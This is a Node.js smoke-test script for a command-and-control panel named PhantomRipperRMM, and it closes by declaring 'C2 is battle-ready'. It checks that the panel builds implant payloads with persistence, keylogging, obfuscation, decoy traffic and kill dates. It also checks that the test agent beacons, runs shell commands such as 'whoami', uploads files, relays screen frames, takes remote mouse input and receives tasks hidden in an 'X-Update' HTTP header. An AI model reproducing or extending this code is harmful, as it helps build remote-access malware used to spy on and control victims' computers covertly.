#!/usr/bin/env node
// ---------------------------------------------------------------------------
// PhantomRipperRMM — panel battle suite.
// Boots the REAL panel server (temp SQLite DB) and verifies the full loop:
//   auth -> payload build -> python compile -> task-protocol agent ->
//   structured tasks -> artifact chunk upload -> ws binary frame relay.
//
//   node scripts/smoke_panel.mjs
// ---------------------------------------------------------------------------

import { spawn, execFile } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const SERVER_DIR = path.join(ROOT, 'panel', 'server');
const requireServer = createRequire(path.join(SERVER_DIR, 'package.json'));

const PORT = Number(process.env.SMOKE_PORT || 3222);
const BASE = `http://127.0.0.1:${PORT}`;
const ADMIN_USER = 'smokeadmin';
const ADMIN_PASS = 'smokepass-' + Math.random().toString(36).slice(2);

let passed = 0;
let failed = 0;
const failures = [];

function ok(name, cond, extra = '') {
  if (cond) { passed++; console.log(`  \x1b[32mPASS\x1b[0m  ${name}`); }
  else { failed++; failures.push(name + (extra ? ` :: ${extra}` : '')); console.log(`  \x1b[31mFAIL\x1b[0m  ${name}${extra ? ` :: ${extra}` : ''}`); }
}
function section(t) { console.log(`\n\x1b[36m== ${t} ==\x1b[0m`); }
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function api(method, p, body, token) {
  const res = await fetch(BASE + p, {
    method,
    headers: {
      'Content-Type': 'application/json',
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
    },
    body: body !== undefined ? JSON.stringify(body) : undefined,
  });
  const text = await res.text();
  let json = null;
  try { json = JSON.parse(text); } catch (_) {}
  return { status: res.status, json, text };
}

async function waitForHealth(deadlineMs = 30000) {
  const end = Date.now() + deadlineMs;
  while (Date.now() < end) {
    try {
      const r = await fetch(BASE + '/api/health');
      if (r.ok) return true;
    } catch (_) {}
    await sleep(400);
  }
  return false;
}

function pyCompile(file) {
  return new Promise((resolve) => {
    execFile('python', ['-m', 'py_compile', file], { encoding: 'utf8' }, (err) => resolve(!err));
  });
}

async function main() {
  console.log('\x1b[35m✦ PhantomRipperRMM Panel Battle Suite ✦\x1b[0m');

  const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'pr-smoke-'));
  const server = spawn(process.execPath, [path.join(SERVER_DIR, 'src', 'index.js')], {
    cwd: SERVER_DIR,
    env: {
      ...process.env,
      PORT: String(PORT),
      DB_PATH: path.join(dataDir, 'panel.db'),
      JWT_SECRET: 'smoke-secret',
      ADMIN_USER,
      ADMIN_PASS,
      PYTHON_BIN: 'python',
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  let serverLog = '';
  server.stdout.on('data', (d) => (serverLog += d));
  server.stderr.on('data', (d) => (serverLog += d));

  let agent = null;
  let wsAgent = null;
  let operatorWs = null;

  try {
    section('BOOT');
    ok('server health 200', await waitForHealth());

    section('AUTH');
    const badLogin = await api('POST', '/api/auth/login', { username: ADMIN_USER, password: 'wrong' });
    ok('bad password rejected 401', badLogin.status === 401);
    const login = await api('POST', '/api/auth/login', { username: ADMIN_USER, password: ADMIN_PASS });
    ok('login 200', login.status === 200 && login.json?.token);
    const token = login.json?.token;
    const me = await api('GET', '/api/auth/me', undefined, token);
    ok('me returns admin', me.json?.user?.role === 'admin');
    const noAuth = await api('GET', '/api/sessions');
    ok('unauthenticated sessions 401', noAuth.status === 401);

    section('PAYLOAD BUILD');
    const build = await api('POST', '/api/builders/build', {
      name: 'smoke_payload', agent_type: 'python', os_target: 'windows',
      transport: 'https', beacon_interval: 2, jitter: 0.1,
      obfuscate: false, persist: true, keylog: true, header_carry: true,
      modules: 'all', decoys: 'https://www.bing.com', killdate: '2027-12-31',
    }, token);
    ok('build 200', build.status === 200 && build.json?.path, JSON.stringify(build.json)?.slice(0, 200));
    ok('payload file exists', build.json?.path && fs.existsSync(build.json.path));
    ok('payload compiles (py_compile)', await pyCompile(build.json.path));

    const obfBuild = await api('POST', '/api/builders/build', {
      name: 'smoke_obf', agent_type: 'python', obfuscate: true, enhanced: true, modules: 'core,esc',
    }, token);
    ok('obfuscated build 200', obfBuild.status === 200 && obfBuild.json?.obfuscated === true);

    const cppBuild = await api('POST', '/api/builders/build', { name: 'smoke_cpp', agent_type: 'cpp' }, token);
    ok('cpp build recorded (queued)', cppBuild.status === 200 && cppBuild.json?.status === 'queued');

    section('TASK-PROTOCOL AGENT LOOP');
    const sessionId = 'smoketask' + Math.random().toString(36).slice(2, 6);
    agent = spawn('python', [path.join(ROOT, 'payloads', 'agent', 'test_agent.py'),
      '--host', BASE, '--id', sessionId, '--interval', '1'], {
      stdio: ['ignore', 'pipe', 'pipe'],
    });
    let agentLog = '';
    agent.stdout.on('data', (d) => (agentLog += d));
    agent.stderr.on('data', (d) => (agentLog += d));

    let sessionRow = null;
    for (let i = 0; i < 30; i++) {
      await sleep(500);
      const s = await api('GET', `/api/sessions/${sessionId}`, undefined, token);
      if (s.status === 200) { sessionRow = s.json?.session; break; }
    }
    ok('agent session registered', !!sessionRow);
    ok('session flagged proto=task', sessionRow?.proto === 'task');
    ok('session caps stored', Array.isArray(sessionRow?.caps) || !!sessionRow?.caps);

    const echoTask = await api('POST', `/api/sessions/${sessionId}/task`, { verb: 'echo', args: 'hello-phantom-42' }, token);
    ok('task queued 200', echoTask.status === 200 && echoTask.json?.task?.task_id);
    const echoId = echoTask.json?.task?.task_id;
    let echoDone = null;
    for (let i = 0; i < 30 && !echoDone; i++) {
      await sleep(500);
      const tasks = await api('GET', `/api/sessions/${sessionId}/tasks`, undefined, token);
      echoDone = (tasks.json || []).find((t) => t.id === echoId && (t.status === 'done' || t.status === 'error'));
    }
    ok('echo task completed', !!echoDone, JSON.stringify(echoDone)?.slice(0, 200));
    ok('echo output matches', echoDone?.response === 'hello-phantom-42', echoDone?.response);

    const shellTask = await api('POST', `/api/sessions/${sessionId}/task`, { verb: 'shell', args: 'whoami' }, token);
    const shellId = shellTask.json?.task?.task_id;
    let shellDone = null;
    for (let i = 0; i < 30 && !shellDone; i++) {
      await sleep(500);
      const tasks = await api('GET', `/api/sessions/${sessionId}/tasks`, undefined, token);
      shellDone = (tasks.json || []).find((t) => t.id === shellId && (t.status === 'done' || t.status === 'error'));
    }
    ok('shell task completed', !!shellDone && shellDone.status === 'done', shellDone?.response?.slice(0, 100));

    const unknownTask = await api('POST', `/api/sessions/${sessionId}/task`, { verb: 'nope_nope', args: '' }, token);
    const unknownId = unknownTask.json?.task?.task_id;
    let unknownDone = null;
    for (let i = 0; i < 30 && !unknownDone; i++) {
      await sleep(500);
      const tasks = await api('GET', `/api/sessions/${sessionId}/tasks`, undefined, token);
      unknownDone = (tasks.json || []).find((t) => t.id === unknownId && t.status !== 'queued' && t.status !== 'sent');
    }
    ok('unknown verb degrades gracefully', !!unknownDone && /unknown verb/.test(unknownDone.response || ''));

    section('ARTIFACT CHANNEL');
    const artTask = await api('POST', `/api/sessions/${sessionId}/task`, { verb: 'artifact', args: 'battle_report.bin 200000' }, token);
    const artId = artTask.json?.task?.task_id;
    let artDone = null;
    for (let i = 0; i < 40 && !artDone; i++) {
      await sleep(500);
      const tasks = await api('GET', `/api/sessions/${sessionId}/tasks`, undefined, token);
      artDone = (tasks.json || []).find((t) => t.id === artId && (t.status === 'done' || t.status === 'error'));
    }
    ok('artifact task completed', artDone?.status === 'done', artDone?.response);
    const artifacts = await api('GET', '/api/artifacts', undefined, token);
    const report = (artifacts.json || []).find((a) => a.name === 'battle_report.bin');
    ok('artifact recorded', !!report);
    ok('artifact size 200000', report?.size === 200000, `size=${report?.size}`);

    // verify sha256 by downloading
    let shaOk = false;
    if (report) {
      const dl = await fetch(`${BASE}/api/artifacts/${report.id}/download?token=${encodeURIComponent(token)}`);
      const buf = Buffer.from(await dl.arrayBuffer());
      const h = require('node:crypto').createHash('sha256').update(buf).digest('hex');
      shaOk = buf.length === 200000 && h === report.sha256;
    }
    ok('artifact round-trip sha256 matches', shaOk);

    section('WS BINARY FRAME RELAY');
    const WebSocket = requireServer('ws');
    let opFrames = [];
    await new Promise((resolve) => {
      operatorWs = new WebSocket(`${BASE.replace('http', 'ws')}/ws/operator?token=${encodeURIComponent(token)}`);
      operatorWs.on('message', (raw) => {
        try {
          const msg = JSON.parse(raw.toString());
          if (msg.type === 'agent_frame') opFrames.push(msg.payload);
          if (msg.type === 'hello') resolve();
        } catch (_) {}
      });
      operatorWs.on('open', () => { /* hello will resolve */ });
      setTimeout(resolve, 5000);
    });
    ok('operator ws connected (hello)', operatorWs.readyState === 1);

    const framePayload = Buffer.from('FAKEPNG' + 'x'.repeat(512));
    const frame = Buffer.alloc(5 + framePayload.length);
    frame.writeUInt8(0x01, 0);
    frame.writeUInt32LE(framePayload.length, 1);
    framePayload.copy(frame, 5);

    await new Promise((resolve) => {
      wsAgent = new WebSocket(`${BASE.replace('http', 'ws')}/ws/agent?id=wsagent01`);
      wsAgent.on('open', () => {
        // register as text, then blast the binary frame
        wsAgent.send(JSON.stringify({ type: 'register', info: { hostname: 'ws-host', proto: 'task', caps: ['shell'] } }));
        setTimeout(() => { wsAgent.send(frame, { binary: true }); resolve(); }, 300);
      });
      wsAgent.on('error', () => resolve());
      setTimeout(resolve, 5000);
    });
    await sleep(1200);
    const got = opFrames.find((f) => f.session === 'wsagent01');
    ok('binary frame relayed to operator', !!got);
    ok('frame payload intact', got && Buffer.from(got.data, 'base64').equals(framePayload));

    // operator input -> agent binary
    let inputFrame = null;
    await new Promise((resolve) => {
      if (!wsAgent || wsAgent.readyState !== 1) return resolve();
      wsAgent.on('message', (raw, isBinary) => {
        if (isBinary) { inputFrame = Buffer.from(raw); resolve(); }
      });
      operatorWs.send(JSON.stringify({ type: 'agent_input', payload: { session: 'wsagent01', action: 'click', x: 100, y: 200 } }));
      setTimeout(resolve, 4000);
    });
    ok('operator input relayed as binary to agent', !!inputFrame && inputFrame[0] === 0x02);

    section('LEGACY COMPATIBILITY');
    const legacyId = 'smokelegacy01';
    const legacyBeacon = await api('POST', '/api/beacon', {
      session_id: legacyId,
      info: { hostname: 'legacy-host', username: 'tester', os: 'Windows', agent_type: 'python' },
    });
    ok('legacy agent beacon ok', legacyBeacon.status === 200);
    await api('POST', `/api/sessions/${legacyId}/command`, { command: 'echo hi-legacy' }, token);
    let legacyCmd = null;
    for (let i = 0; i < 10; i++) {
      const b = await api('POST', '/api/beacon', { session_id: legacyId, first: false, info: {} });
      if (b.json?.command) { legacyCmd = b.json.command; break; }
      await sleep(300);
    }
    ok('legacy command delivered as string', typeof legacyCmd === 'string' && legacyCmd.includes('hi-legacy'));
    const legacyResp = await api('POST', '/api/response', { session_id: legacyId, command: legacyCmd, output: 'hi-legacy-done' });
    ok('legacy response accepted', legacyResp.status === 200);

    section('HEADER-CARRY PROFILE');
    const hdrBeacon = await api('POST', '/api/beacon', {
      session_id: 'smokehdr01',
      info: { hostname: 'hdr-host', proto: 'task', hdr: 1, caps: ['shell'] },
    });
    ok('hdr agent beacons ok', hdrBeacon.status === 200);
    await api('POST', `/api/sessions/smokehdr01/task`, { verb: 'echo', args: 'via-header' }, token);
    // beacon again with raw fetch to inspect the header
    const raw = await fetch(BASE + '/api/beacon', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ session_id: 'smokehdr01', first: false, info: { hdr: 1, proto: 'task' } }),
    });
    const xUpdate = raw.headers.get('x-update');
    ok('X-Update header carry present', !!xUpdate);
    if (xUpdate) {
      const task = JSON.parse(Buffer.from(xUpdate, 'base64url').toString('utf8'));
      ok('header task decodes', task.verb === 'echo' && task.args === 'via-header');
    }

    section('NOTIFY + STATS');
    const stats = await api('GET', '/api/stats', undefined, token);
    ok('stats counts sessions', (stats.json?.total || 0) >= 3, `total=${stats.json?.total}`);
    const events = await api('GET', '/api/events?limit=50', undefined, token);
    ok('events recorded', (events.json || []).length > 0);
  } catch (err) {
    failed++;
    failures.push('suite crashed: ' + err.message);
    console.error(err);
  } finally {
    try { agent && agent.kill(); } catch (_) {}
    try { wsAgent && wsAgent.close(); } catch (_) {}
    try { operatorWs && operatorWs.close(); } catch (_) {}
    try { server.kill(); } catch (_) {}
    await sleep(400);
    try { fs.rmSync(dataDir, { recursive: true, force: true }); } catch (_) {}
  }

  console.log(`\n\x1b[35m──────── RESULTS ────────\x1b[0m`);
  console.log(`  \x1b[32mPASS: ${passed}\x1b[0m`);
  console.log(`  \x1b[${failed ? '31' : '32'}mFAIL: ${failed}\x1b[0m`);
  if (failed) {
    for (const f of failures) console.log(`   - ${f}`);
    process.exit(1);
  }
  console.log('\n  \x1b[32m✦ PANEL ALL GREEN — C2 is battle-ready ✦\x1b[0m');
  process.exit(0);
}

main();
